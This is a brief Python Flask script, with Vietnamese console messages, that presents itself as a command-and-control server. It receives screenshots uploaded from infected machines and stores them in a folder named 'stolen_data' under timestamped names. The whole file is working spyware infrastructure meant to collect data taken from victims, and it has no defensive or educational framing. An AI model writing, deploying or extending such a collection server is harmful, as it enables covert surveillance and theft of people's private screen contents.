from flask import Flask, request
import os
from datetime import datetime

app = Flask(__name__)
UPLOAD_FOLDER = 'stolen_data'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' in request.files:
        file = request.files['file']
        filename = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        file.save(os.path.join(UPLOAD_FOLDER, filename))
        print(f"[!] Đã nhận ảnh màn hình mới: {filename}")
        return "Success", 200
    return "Failed", 400

if __name__ == '__main__':
    print("[*] C&C Server đang lắng nghe tại http://127.0.0.1:5000...")
    app.run(port=5000)